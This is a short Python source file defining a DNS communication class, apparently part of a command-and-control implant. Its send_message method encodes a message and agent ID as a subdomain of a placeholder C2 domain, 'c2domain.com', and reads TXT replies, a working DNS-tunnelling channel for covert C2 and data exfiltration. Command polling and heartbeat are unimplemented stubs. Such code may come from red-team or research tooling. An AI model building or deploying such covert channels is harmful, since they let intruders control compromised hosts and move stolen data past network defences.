import dns.message
import dns.query
from ..logger import logger
from base import BaseComm

class DNSComm(BaseComm):
    def __init__(self, dns_server_ip: str, agent_id: str, auth_token: str):
        self.dns_server_ip = dns_server_ip
        self.agent_id = agent_id
        self.auth_token = auth_token

    def poll_commands(self):
        logger.info("DNS poll_commands not implemented")
        return []

    def send_message(self, message: str) -> str:
        try:
            domain = f"{message}.{self.agent_id}.c2domain.com"
            query = dns.message.make_query(domain, dns.rdatatype.TXT)
            response = dns.query.udp(query, self.dns_server_ip, timeout=2)
            for answer in response.answer:
                for item in answer.items:
                    if hasattr(item, "strings"):
                        return b" ".join(item.strings).decode()
        except Exception as e:
            logger.error("DNS send_message error: %s", e)
        return ""

    def heartbeat(self):
        logger.info("DNS heartbeat not implemented")
